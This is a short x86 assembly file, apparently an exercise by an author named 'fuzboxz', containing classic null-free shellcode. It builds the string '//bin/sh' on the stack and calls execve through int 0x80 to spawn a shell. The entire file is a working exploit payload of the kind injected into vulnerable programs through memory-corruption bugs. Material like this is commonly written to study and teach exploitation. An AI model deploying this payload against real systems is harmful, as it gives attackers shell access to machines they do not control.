; author: fuzboxz

global _start

section .text

_start:

    ; Push //bin/sh0x00 onto the stack
    ; null byte
    xor eax, eax ; null out eax
    push eax ; null byte
    ; //bin/sh
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    
    mov ebx, esp ; address of the program name -> //bin/sh0x00

    push eax ; push another null for the sys argv
    mov edx, esp ; sysargv arguments - address as above, but now with extra bytes

    push ebx
    mov ecx, esp

    mov al, 11 ; execve syscall
    int 0x80 ; call execve